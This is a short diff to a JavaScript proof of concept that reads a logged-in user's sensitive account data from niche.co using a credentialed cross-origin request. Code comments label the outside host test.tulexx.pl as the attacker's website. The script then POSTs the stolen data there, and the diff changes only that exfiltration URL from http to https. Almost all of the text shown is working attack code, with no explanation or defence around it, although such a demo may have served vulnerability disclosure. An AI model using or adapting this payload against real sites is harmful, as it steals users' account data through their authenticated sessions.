@@ -9,7 +9,7 @@ xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
 var a = this.responseText; // Sensitive data from niche.co about user account
 document.getElementById("demo").innerHTML = a;
-xhttp.open("POST", "http://test.tulexx.pl/", true);// Sending that data to Attacker's website
+xhttp.open("POST", "https://test.tulexx.pl/", true);// Sending that data to Attacker's website
 xhttp.withCredentials = true;
 console.log(a);
 xhttp.send("data="+a);
